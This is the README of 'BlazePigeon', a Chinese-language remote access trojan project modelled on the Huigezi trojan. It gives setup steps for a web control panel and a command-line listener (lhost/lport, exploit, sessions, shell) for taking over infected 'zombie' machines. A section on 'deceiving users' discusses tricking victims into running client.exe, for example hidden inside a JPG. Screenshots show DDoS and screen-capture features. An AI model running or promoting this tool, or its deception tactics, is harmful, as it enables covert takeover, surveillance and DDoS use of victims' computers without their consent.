# BlazePigeon

## 介绍
BlazePigeon(仿[灰鸽子](https://www.freebuf.com/sectool/273317.html))--远程访问型木马。

![img.png](docs/imgs/prin.png)

## 重要依赖包
```shell
pip install mysql

pip install lxml

pip install pywin32api

pip install requests
```

## 使用说明
有两种模式可以进行使用，web模式和命令行模式

### web模式
- 进入BlazePigeon文件夹，启动web服务
```shell
python manage.py runserver 80 
```
- 访问： http://127.0.0.1:80
- 先要在客户端设置中设置客户端的ip信息
- 检测服务是否在线/截图【Bug: 由于每个socket上只能在一个线程中工作，为防止出错，请在截图前检测是否在线以重新建立连接】

### 命令行模式
- 运行`server.py`
```shell
python server.py
```

- 设置ip和port
```shell
set lhost xxxx

set lport xxxx 
```

- 可用命令【建议按照顺序执行】
- `exploit`: 进行监听客户端
- `sessions`: 进行查看当前在线肉鸡数 
- `shell <id>`: 控制客户端为id的shell, 之后使用`shell`进入客户端的shell
- 使用正确的shell命令【cmd命令集 | linux shell命令集】进行“为所欲为”
- `exit`: 推出程序

## 欺骗客户
- 在有了以上的监控平台，下一步就是怎么“欺骗”用户可以在机器上运行`client.exe`，以此来建立监控的链接。
- 我想的是在JPG文件中嵌入exe执行文件，然后在双击jpg文件时默默执行嵌入其中的恶意软件，但事实是在Windows上基本无法实现
> In the old days it was possible to exploit when clicking on image exploits or when Windows OS was creating a thumbnail to show the image file itself as an icon. However, with the recent kernel-level updates of the operating system (ASLR, DEP, etc.), the Windows operating system has become difficult to exploit even if there is a new vulnerability. It didn't work out well in my few attempts. However, the situation is different in browsers. It is possible to run malware only when viewing file contents such as pictures, audio, video via browsers. It is not mentioned much yet that such vulnerabilities create a very dangerous situation for mobile devices.
- 鉴于此，只能写一个程序来解析JPG图片中的恶意程序，那么怎么来解决了解析软件的客户欺骗呢？似乎形成了一个闭环，emmmmm

## 展示

- Login

![img1](./docs/imgs/img0.png)

- Home

![img.png](docs/imgs/img.png)

- Client Setting

![img_1.png](docs/imgs/img_1.png)

- DDos Setting

![img_2.png](docs/imgs/img_2.png)

- Screen Shoot

![img3.png](docs/imgs/img3.png)